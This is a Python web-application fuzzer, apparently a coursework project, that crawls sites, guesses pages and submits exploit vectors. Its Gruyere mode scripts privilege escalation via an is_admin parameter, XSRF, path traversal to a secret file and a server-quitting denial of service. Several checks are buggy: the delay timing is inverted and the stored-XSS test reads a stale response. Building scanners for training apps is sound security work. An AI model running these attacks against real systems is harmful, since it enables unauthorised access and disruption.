import argparse
import random
import mechanicalsoup
import time
from fuzzMethods import*


class Fuzz:




    # Creating a browser object to access websites
    browser = mechanicalsoup.StatefulBrowser()
    # Creating a parser to enable this program to run on a command prompt.
    parser = argparse.ArgumentParser(prog="Fuzz tester",
                                     description='A fuzz tester that will test any given website for '
                                                 'vulnerabilities and then give a report on it.')
    parser.add_argument("action", nargs='?', default="",
                        help="[discover | test] - discover: Output a comprehensive, human-readable list of all "
                             "discovered inputs to the system (e.g., form fields, search boxes)."
                             " Techniques include both crawling and guessing. "
                             "test: Discover all inputs, then attempt a list of exploit "
                             "vectors on those inputs. Report potential vulnerabilities.")

    # Taking a website as an argument.
    parser.add_argument("url", nargs='?', default="",
                        help="This is the website you would like to test.")

    # Creating the custom-auth argument to parser.
    parser.add_argument("--custom-auth=string",dest="custom",
                        help="Signal that the fuzzer python should use hard-coded authentication for a specific "
                             "application "
                             "(e.g. dvwa). Optional.")

    parser.add_argument("--common-words=file", dest="common",
                        help="Newline-delimited file of common words to be used in page guessing. Required.")


    # vectors option
    parser.add_argument("--vectors", dest="vectors",
                      help="Newline-delimited file of common exploits to vulnerabilities. Required.",
                      metavar="FILE")

    # random option
    parser.add_argument("--random", dest="random", default="False",
                      help="[true|false]  When off, try each input to each page systematically. "
                           "When on, choose a random page, then a random input field and test all vectors. "
                           "Default: false.",
                      metavar="BOOLEAN")

    # slow option
    parser.add_argument("--slow", dest="slow_ms", default=500,
                      help="Number of milliseconds considered when a response is considered 'slow' "
                           "Default is 500 milliseconds", metavar="NUMBER")

    # sensitive data option
    parser.add_argument("--sensitive", dest="sensitive",
                      help=" Newline-delimited file data that should never be leaked. It's assumed that this data is "
                           "in the application's database (e.g. test data), but is not reported in any response. "
                           "Required.",
                      metavar="FILE")
    # Creating an object to access command line arguments
    args = parser.parse_args()
    action = args.action
    url = args.url
    custom = args.custom

    if action == "discover" or action == "test":

        # The program will login to given website with dvwa credentials
        if custom == 'dvwa':
            website = url
            browser = dvwa_relogin(browser)
            response = browser.open(website)
            if response.status_code != 200:
                print("Page not reached.\n\n")
            else:
                print("Page Reached\n\n")
            if action == "discover":
                print("Beginning discover...\n\n")
            else:
                print("Beginning test...\n")
            cookies = list()
            cookies = browser.get_cookiejar()
            mainPage = browser.get_url()


            # Looking for all links on page


            urls = browser.links()
            validUrls = list()

            print("Crawling Site...")

            for url in urls:
                reached = False
                # making sure we weren't logged out
                if "http://127.0.0.1/dvwa/login.php" in browser.get_url() and "logout.php" not in browser.get_url():
                    browser = dvwa_relogin(browser)
                # try:
                #     browser.follow_link(url)
                #     reached = True
                # except:
                #     print("Couldn't reach: ", url.string)
                # if reached:
                #     if website in browser.get_url():
                #         try:
                #             newUrls = browser.links()
                #             for newUrl in newUrls:
                #                 if newUrl not in urls:
                #                     urls.append(newUrl)
                #             validUrls.append(browser.get_url())
                #         except:
                #             print("Not a website, must be a pdf or zip file...: ", browser.get_url())
                browser.follow_link(url)
                if 'dvwa' in browser.get_url():
                    validUrls.append(browser.get_url())
                browser.open(mainPage)

            # Trying to guess pages
            guessedPages = list()
            common_ext = open("commonExtensions.txt", "r").read().splitlines()

            try:
                common_pages = open(args.common, "r").read().splitlines()
            except:
                print("list of common words file not found: " + args.common)

            if common_pages:
                for test in common_pages:
                    for ext in common_ext:
                        potentialPage = browser.open(args.url + test + "." + ext)
                        # making sure we weren't logged out
                        if "http://127.0.0.1/dvwa/login.php" in browser.get_url() and "logout.php" not in browser.get_url():
                            browser = dvwa_relogin(browser, args.url)
                            potentialPage = browser.open(args.url + test + "." + ext)

                        # making sure its not already discovered, status code below 300 is successfully reached
                        if potentialPage.status_code < 300 and browser.get_url() not in validUrls:
                            validUrls.append(browser.get_url())
                            guessedPages.append(browser.get_url())


            # Loooking for inputs on all links
            pages = list()

            for url in validUrls:
                if "http://127.0.0.1/dvwa/login.php" in browser.get_url() and "logout.php" not in browser.get_url():
                    browser = dvwa_relogin(browser, args.url)
                browser.open(url)
                possibleForms = browser.get_current_page().find_all('form')
                forms = list()
                for form in possibleForms:
                    inputList = list()
                    defForm = {'name': '', 'inputs': list()}
                    forms.append(defForm)
                    for input_field in form.find_all('input'):
                        if input_field.has_attr('name'):
                            defForm['inputs'].append(input_field['name'])

                page = {'url': url, "forms": forms}
                pages.append(page)

            if args.action == 'discover':
                print("LINKS FOUND ON PAGE:")
                print("-------------------------")
                print("-------------------------")
                for url in validUrls:
                    print(url)
                print()
                print()
                print("GUESSED PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for guess in guessedPages:
                    print(guess)
                print()
                print()
                print("INPUT FORMS ON PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for page in pages:
                    print(page.get('url'), ": ")
                    for form in page.get('forms'):
                        for input in form.get('inputs'):
                            print(input)
                print()
                print()
                # Display cookies
                print("COOKIES FOUND: ")
                print("-------------------------")
                print("-------------------------")
                for cookie in cookies:
                    print(cookie)

            elif args.action == 'test':
                if args.vectors is None or args.sensitive is None:
                    print('No vector or sensitive file given!!')
                else:

                    vectors = open(args.vectors, "r").read().splitlines()
                    sensitive = open(args.sensitive, "r").read().splitlines()
                    DELAY_THRESHOLD = float(args.slow_ms)

                    print("Checking all inputs on all pages...")

                    for page in pages:
                        forms = page.get("forms")
                        url = page.get("url")
                        print(url,": ")
                        if "http://127.0.0.1/dvwa/login.php" in browser.get_url() and "logout.php" not in browser.get_url():
                            browser = dvwa_relogin(browser)

                        if args.random == "False" or args.random == "false":
                            # Sanitize
                            print("Sanitize:\n")
                            sanit = False
                            sql = False
                            browser.open(url)
                            browser.session.cookies["security"] = "low"
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        if "MySQL " in response.text:
                                            sql = True
                                        if "<" in vector or ">" in vector or "/" in vector or "\"" in vector or "?" in vector:
                                            if vector in response.text:
                                                sanit = True
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")


                            if sql:
                                print("Possible SQL exploit found on page.")
                            if sanit:
                                print("Special characters were not sanitized or escaped in page " + url)
                            # Delay
                            print("Delay:\n")
                            delay = False
                            for form in forms:
                                for vector in vectors:

                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    start_time = time.time()
                                    try:
                                        response = browser.submit_selected()
                                        # print(response.text)
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")

                                    end_time = time.time()
                                    total_time = start_time - end_time
                                    if total_time > DELAY_THRESHOLD:
                                        delay = True
                            if delay:
                                print("Delayed Response: ", url, " - ", total_time)

                            # HTTP Response
                            print("HTTP:\n")
                            HTTP = False
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        if hasattr(response, 'status_code'):
                                            if response.status_code < 200 or response.status_code > 299:
                                                HTTP = True
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")

                            if HTTP:
                                print("HTTP Response !200 - ", url, " - ", response.status_code)


                            # Leak
                            print("Leak:\n")
                            leak = False
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        # print(response.text)
                                        for item in sensitive:
                                            if item in response.text:
                                                leak = True
                                    except FileNotFoundError:
                                        print("Upload Page Broke")
                                    # if form.get('method') == 'post' or form.get('method') == 'POST':
                                    #     response = browser.session.post(url + action, data=payload)
                                    # elif form.get("method") == 'get' or form.get('method') == "GET":
                                    #     response = browser.session.get(url + action, params=payload)

                                    browser.open(url)
                            if leak:
                                print("Sensitive data leaked: ", item)

         #SWITCHING TO GRUYERE


        elif custom == 'gruyere':
            browser = gruyere_relogin(browser, url)
            response = browser.open(url)
            if response.status_code != 200:
                print("Page not reached.\n\n")
            else:
                print("Page Reached\n\n")
            if action == "discover":
                print("Beginning discover...\n\n")
            else:
                print("Beginning test...\n")
            cookies = list()
            cookies = browser.get_cookiejar()
            mainPage = browser.get_url()
            soup = browser.get_current_page()
            for link in soup.find_all('a'):
                if link.string == "Home":
                    instanceID = link.get("href")



            print("Your instance ID: \n", instanceID)


            # Looking for all links on page

            print("Crawling Site...")

            urls = browser.links()
            validUrls = list()

            for url in urls:
                reached = False
                # making sure we weren't logged out
                if "logout" in browser.get_url():
                    browser = gruyere_relogin(browser)
                # try:
                #     browser.follow_link(url)
                #     reached = True
                # except:
                #     print("Couldn't reach: ", url.string)
                # if reached:
                #     if website in browser.get_url():
                #         try:
                #             newUrls = browser.links()
                #             for newUrl in newUrls:
                #                 if newUrl not in urls:
                #                     urls.append(newUrl)
                #             validUrls.append(browser.get_url())
                #         except:
                #             print("Not a website, must be a pdf or zip file...: ", browser.get_url())
                browser.follow_link(url)
                if instanceID in browser.get_url():
                    validUrls.append(browser.get_url())
                browser.open(mainPage)

            # Trying to guess pages
            guessedPages = list()
            common_ext = open("commonExtensions.txt", "r").read().splitlines()

            try:
                common_pages = open(args.common, "r").read().splitlines()
            except:
                print("list of common words file not found: " + args.common)

            if common_pages:
                for test in common_pages:
                    for ext in common_ext:
                        potentialPage = browser.open(args.url + test + "." + ext)
                        # making sure we weren't logged out
                        if "logout" in browser.get_url():
                            browser = gruyere_relogin(browser, url)
                            potentialPage = browser.open(args.url + test + "." + ext)

                        # making sure its not already discovered, status code below 300 is successfully reached
                        if potentialPage.status_code < 300 and browser.get_url() not in validUrls:
                            validUrls.append(browser.get_url())
                            guessedPages.append(browser.get_url())

            # Loooking for inputs on all links
            pages = list()

            for url in validUrls:
                if "logout" in browser.get_url():
                    browser = gruyere_relogin(browser, url)
                browser.open(url)
                possibleForms = browser.get_current_page().find_all('form')
                forms = list()
                for form in possibleForms:
                    inputList = list()
                    defForm = {'name': '', 'inputs': list()}
                    for input_field in form.find_all('input'):
                        if input_field.has_attr('name'):
                            defForm['inputs'].append(input_field['name'])
                    for text_field in form.find_all('textarea'):
                        if text_field.has_attr('name'):
                            defForm['inputs'].append(text_field['name'])
                    forms.append(defForm)

                page = {'url': url, "forms": forms}
                pages.append(page)

            if action == 'discover':
                print("LINKS FOUND ON PAGE:")
                print("-------------------------")
                print("-------------------------")
                for url in validUrls:
                    print(url)
                print()
                print()
                print("GUESSED PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for guess in guessedPages:
                    print(guess)
                print()
                print()
                print("INPUT FORMS ON PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for page in pages:
                    print(page.get('url'), ": ")
                    for form in page.get('forms'):
                        for input in form.get('inputs'):
                            print(input)
                print()
                print()
                # Display cookies
                print("COOKIES FOUND: ")
                print("-------------------------")
                print("-------------------------")
                for cookie in cookies:
                    print(cookie)

            elif action == 'test':
                url = args.url
                if args.vectors is None or args.sensitive is None:
                    print('No vector or sensitive file given!!')
                else:

                    vectors = open(args.vectors, "r").read().splitlines()
                    sensitive = open(args.sensitive, "r").read().splitlines()
                    DELAY_THRESHOLD = args.slow_ms

                    reflected = False
                    stored = False
                    upload = False


                    for vector in vectors:
                        if "logout" in browser.get_url():
                            browser = gruyere_relogin(browser, url)
                        # XSS Reflected
                        response = browser.open(url + vector)
                        if "<" in vector or ">" in vector or "/" in vector or "\"" in vector or "?" in vector:
                            if vector in response.text:
                                reflected = True
                        # XSS Stored
                        if "logout" in browser.get_url():
                            browser = gruyere_relogin(browser, url)
                        browser.open(url + "newsnippet.gtl")
                        form = browser.select_form()
                        form["snippet"] = vector
                        browser.submit_selected()
                        browser.open(url + "snippets.gtl")
                        if "<" in vector or ">" in vector or "/" in vector or "\"" in vector or "?" in vector:
                            if vector in response.text:
                                stored = True
                    # Upload
                    if "logout" in browser.get_url():
                        browser = gruyere_relogin(browser, url)
                    browser.open(url + "upload.gtl")
                    form = browser.select_form()
                    form["upload_file"] = "test.html"
                    browser.submit_selected()
                    response = browser.open(url + "badmojo/test.html")
                    if "<script>alert(document.cookie);</script>" in response:
                        upload = True

                    if reflected:
                        print("This site is showing signs of being vulnerable: Reflected XSS")
                    elif stored:
                        print("This site is showing signs of being vulnerable: Stored XSS")
                    elif upload:
                        print("This site is showing signs of being vulnerable: Uploaded XSS")

                    # Elevation of privilege
                    elevation = False
                    browser.open(url + "saveprofile?action=update&is_admin=True")
                    browser.open(url + "logout")
                    browser = gruyere_relogin(browser, url)
                    response = browser.open(url)
                    for href in browser.get_current_page().find_all("a"):
                        if href.string == 'Manage this server':
                            elevation = True
                    if elevation:
                        print("Was able to elevate permissions to admin!")

                    # Cookie Manip

                    # XSRF
                    browser.open(url + "newsnippet.gtl")
                    form = browser.select_form()
                    form["snippet"] = "This is a test"
                    browser.submit_selected()
                    browser.open(url + "deletesnippet?index=0")
                    response = browser.open(url + "snippets.gtl")
                    if "This is a test" not in response.text:
                        print("This site is showing signs of being vulnerable: XSRF")

                    # Path Traversal

                    response = browser.open(url + '../secret.txt')
                    if "Invalid request" not in response.text:
                        print("Path traversal found a secret file!")

                    # Denial of Service

                    response = browser.open(url + "quitserver")
                    if "<pre>Server quit.</pre>" in response.text:
                        print("Denial of Service attack worked!")

        # NO Custom Web Crawl

        else:
            website = url
            response = browser.open(website)
            if response.status_code != 200:
                print("Page not reached.\n\n")
            else:
                print("Page Reached\n\n")
            if action == "discover":
                print("Beginning discover...\n\n")
            else:
                print("Beginning test...\n")
            cookies = list()
            cookies = browser.get_cookiejar()
            mainPage = browser.get_url()


            # Looking for all links on page
            urls = browser.links()
            validUrls = list()

            print("Crawling Site...")

            for url in urls:
                reached = False
                browser.follow_link(url)
                if 'google' in browser.get_url():
                    validUrls.append(browser.get_url())
                browser.open(mainPage)

            # Trying to guess pages
            guessedPages = list()
            common_ext = open("commonExtensions.txt", "r").read().splitlines()

            try:
                common_pages = open(args.common, "r").read().splitlines()
            except:
                print("list of common words file not found: " + args.common)

            if common_pages:
                for test in common_pages:
                    for ext in common_ext:
                        potentialPage = browser.open(args.url + test + "." + ext)
                        # making sure its not already discovered, status code below 300 is successfully reached
                        if potentialPage.status_code < 300 and browser.get_url() not in validUrls:
                            validUrls.append(browser.get_url())
                            guessedPages.append(browser.get_url())


            # Loooking for inputs on all links
            pages = list()

            for url in validUrls:
                browser.open(url)
                possibleForms = browser.page.find_all('form')
                forms = list()
                for form in possibleForms:
                    inputList = list()
                    defForm = {'name': '', 'inputs': list()}
                    forms.append(defForm)
                    for input_field in form.find_all('input'):
                        if input_field.has_attr('name'):
                            defForm['inputs'].append(input_field['name'])

                page = {'url': url, "forms": forms}
                pages.append(page)

            if args.action == 'discover':
                print("LINKS FOUND ON PAGE:")
                print("-------------------------")
                print("-------------------------")
                for url in validUrls:
                    print(url)
                print()
                print()
                print("GUESSED PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for guess in guessedPages:
                    print(guess)
                print()
                print()
                print("INPUT FORMS ON PAGES: ")
                print("-------------------------")
                print("-------------------------")
                for page in pages:
                    print(page.get('url'), ": ")
                    for form in page.get('forms'):
                        for input in form.get('inputs'):
                            print(input)
                print()
                print()
                # Display cookies
                print("COOKIES FOUND: ")
                print("-------------------------")
                print("-------------------------")
                for cookie in cookies:
                    print(cookie)

            elif args.action == 'test':
                if args.vectors is None or args.sensitive is None:
                    print('No vector or sensitive file given!!')
                else:

                    vectors = open(args.vectors, "r").read().splitlines()
                    sensitive = open(args.sensitive, "r").read().splitlines()
                    DELAY_THRESHOLD = float(args.slow_ms)

                    print("Checking all inputs on all pages...")

                    for page in pages:
                        forms = page.get("forms")
                        url = page.get("url")
                        print(url,": ")
                        if args.random == "False" or args.random == "false":
                            # Sanitize
                            print("Sanitize:\n")
                            sanit = False
                            sql = False
                            browser.open(url)
                            browser.session.cookies["security"] = "low"
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        if "MySQL " in response.text:
                                            sql = True
                                        if "<" in vector or ">" in vector or "/" in vector or "\"" in vector or "?" in vector:
                                            if vector in response.text:
                                                sanit = True
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")


                            if sql:
                                print("Possible SQL exploit found on page.")
                            if sanit:
                                print("Special characters were not sanitized or escaped in page " + url)
                            # Delay
                            print("Delay:\n")
                            delay = False
                            for form in forms:
                                for vector in vectors:

                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    start_time = time.time()
                                    try:
                                        response = browser.submit_selected()
                                        # print(response.text)
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")

                                    end_time = time.time()
                                    total_time = start_time - end_time
                                    if total_time > DELAY_THRESHOLD:
                                        delay = True
                            if delay:
                                print("Delayed Response: ", url, " - ", total_time)

                            # HTTP Response
                            print("HTTP:\n")
                            HTTP = False
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        if hasattr(response, 'status_code'):
                                            if response.status_code < 200 or response.status_code > 299:
                                                HTTP = True
                                        browser.open(url)
                                    except FileNotFoundError:
                                        print("Upload Page Broke")

                            if HTTP:
                                print("HTTP Response !200 - ", url, " - ", response.status_code)


                            # Leak
                            print("Leak:\n")
                            leak = False
                            for form in forms:
                                for vector in vectors:
                                    browser.select_form()
                                    for input in form.get("inputs"):
                                        browser[input] = vector
                                    try:
                                        response = browser.submit_selected()
                                        # print(response.text)
                                        for item in sensitive:
                                            if item in response.text:
                                                leak = True
                                    except FileNotFoundError:
                                        print("Upload Page Broke")
                                    # if form.get('method') == 'post' or form.get('method') == 'POST':
                                    #     response = browser.session.post(url + action, data=payload)
                                    # elif form.get("method") == 'get' or form.get('method') == "GET":
                                    #     response = browser.session.get(url + action, params=payload)

                                    browser.open(url)
                            if leak:
                                print("Sensitive data leaked: ", item)







































    else:
        print("You must use either ''discover'' or ''test''")




